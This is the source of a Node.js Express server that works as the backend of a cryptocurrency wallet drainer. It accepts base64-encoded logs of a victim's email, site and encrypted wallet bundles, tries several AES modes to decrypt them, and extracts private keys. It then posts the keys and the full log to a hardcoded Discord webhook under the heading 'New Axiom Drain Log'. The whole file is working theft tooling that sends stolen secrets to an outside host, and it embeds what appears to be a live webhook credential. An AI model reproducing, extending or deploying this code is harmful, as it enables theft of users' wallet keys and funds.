const express = require('express');
const axios = require('axios');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518196583206879272/TKj5GIGfWVOyluZOUxDvZ4ZSCi7_QMROkpDCg1CZ5fbYVDbZi6QHpjql2qyjzmmJYm0j";

app.use(express.raw({ type: '*/*', limit: '10mb' }));
app.use(express.json({ limit: '10mb' }));

app.get('/data/:payload', async (req, res) => {
    try {
        const encoded = req.params.payload;
        const decodedStr = Buffer.from(encoded, 'base64').toString('utf-8');
        let data = JSON.parse(decodedStr);

        console.log("✅ Log received from:", data.site);

        if (data.portfolio) {
            data.portfolio = decryptPortfolio(data.portfolio);
        }

        await sendToDiscord(data);

        res.status(200).send('OK');
    } catch (error) {
        console.error("❌ Error:", error.message);
        res.status(400).send('Bad Request');
    }
});

function decryptPortfolio(portfolio) {
    const bundleKeyB64 = portfolio.bundleKey;
    if (!bundleKeyB64) {
        portfolio.decryption_note = "No bundleKey present";
        return portfolio;
    }

    if (portfolio.sBundles) {
        try {
            const bundles = JSON.parse(portfolio.sBundles);
            portfolio.sBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, bundleKeyB64));
        } catch (e) {
            portfolio.sBundlesDecrypted = { error: e.message };
        }
    }

    if (portfolio.eBundles) {
        try {
            const bundles = JSON.parse(portfolio.eBundles);
            portfolio.eBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, bundleKeyB64));
        } catch (e) {
            portfolio.eBundlesDecrypted = { error: e.message };
        }
    }

    return portfolio;
}

function decryptSingleBundle(bundleStr, bundleKeyB64) {
    if (!bundleStr || !bundleStr.includes(':')) return { raw: bundleStr };

    const [prefix, encryptedPart] = bundleStr.split(':', 2);
    const result = tryDecryptAES(encryptedPart, bundleKeyB64);

    if (result.success) {
        try {
            return { prefix, data: JSON.parse(result.decrypted), method: result.method };
        } catch {
            return { prefix, decrypted: result.decrypted, method: result.method };
        }
    } else {
        return { prefix, error: result.error, raw: encryptedPart };
    }
}

function tryDecryptAES(encryptedB64, keyB64) {
    const key = Buffer.from(keyB64, 'base64');
    const derivedKey = crypto.createHash('sha256').update(keyB64).digest();

    const attempts = [
        { name: "CBC-ZeroIV", mode: 'aes-256-cbc', key: key, iv: Buffer.alloc(16, 0) },
        { name: "CBC-KeyIV",  mode: 'aes-256-cbc', key: key, iv: key.slice(0, 16) },
        { name: "CBC-DerivedZero", mode: 'aes-256-cbc', key: derivedKey, iv: Buffer.alloc(16, 0) },
        { name: "CBC-EmptyIV", mode: 'aes-256-cbc', key: key, iv: Buffer.alloc(16) },
        { name: "ECB", mode: 'aes-256-ecb', key: key, iv: null },
        { name: "CBC-FullKeyIV", mode: 'aes-256-cbc', key: key, iv: key },
    ];

    for (const att of attempts) {
        try {
            let decipher;
            if (att.iv === null) {
                decipher = crypto.createDecipher(att.mode, att.key);
            } else {
                decipher = crypto.createDecipheriv(att.mode, att.key, att.iv);
            }

            let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
            decrypted += decipher.final('utf8');

            return { success: true, decrypted, method: att.name };
        } catch (e) {}
    }

    return { success: false, error: "All decryption attempts failed" };
}

async function sendToDiscord(data) {
    const portfolio = data.portfolio || {};
    const hasSuccess = (portfolio.sBundlesDecrypted && portfolio.sBundlesDecrypted.some(b => b.data)) ||
                       (portfolio.eBundlesDecrypted && portfolio.eBundlesDecrypted.some(b => b.data));

    // Main Embed
    const mainEmbed = {
        title: "📥 New Axiom Drain Log",
        color: hasSuccess ? 0x00FF00 : 0xFF0000,
        fields: [
            { name: "Email", value: data.user?.email || "N/A", inline: true },
            { name: "Site", value: data.site || "N/A", inline: true },
            { name: "Decryption", value: hasSuccess ? "✅ Success" : "❌ Failed", inline: true }
        ],
        timestamp: new Date().toISOString()
    };

    // Summary Embed (Pub/Priv Keys)
    let summaryFields = [
        { name: "Email", value: data.user?.email || "N/A" },
        { name: "Site", value: data.site || "N/A" }
    ];

    // Extract keys if decryption succeeded
    if (hasSuccess) {
        const allKeys = [];
        if (portfolio.sBundlesDecrypted) {
            portfolio.sBundlesDecrypted.forEach(b => {
                if (b.data && b.data.privateKey) allKeys.push({ type: "Private", key: b.data.privateKey });
                if (b.data && b.data.publicKey) allKeys.push({ type: "Public", key: b.data.publicKey });
            });
        }
        if (portfolio.eBundlesDecrypted) {
            portfolio.eBundlesDecrypted.forEach(b => {
                if (b.data && b.data.privateKey) allKeys.push({ type: "Private", key: b.data.privateKey });
                if (b.data && b.data.publicKey) allKeys.push({ type: "Public", key: b.data.publicKey });
            });
        }

        allKeys.forEach((k, i) => {
            summaryFields.push({
                name: `${k.type} Key ${i+1}`,
                value: `\`\`\`${k.key}\`\`\``
            });
        });
    }

    const summaryEmbed = {
        title: "📋 Summary",
        color: 0x00AAFF,
        fields: summaryFields.slice(0, 25) // Discord limit
    };

    try {
        await axios.post(DISCORD_WEBHOOK, {
            content: "**New Drain Log**",
            embeds: [mainEmbed, summaryEmbed],
            files: [{
                attachment: Buffer.from(JSON.stringify(data, null, 2), 'utf-8'),
                name: `full_log_${Date.now()}.json`
            }]
        });
    } catch (err) {
        console.error("Discord error:", err.message);
    }
}

app.listen(PORT, () => console.log(`🚀 Backend running on port ${PORT}`));
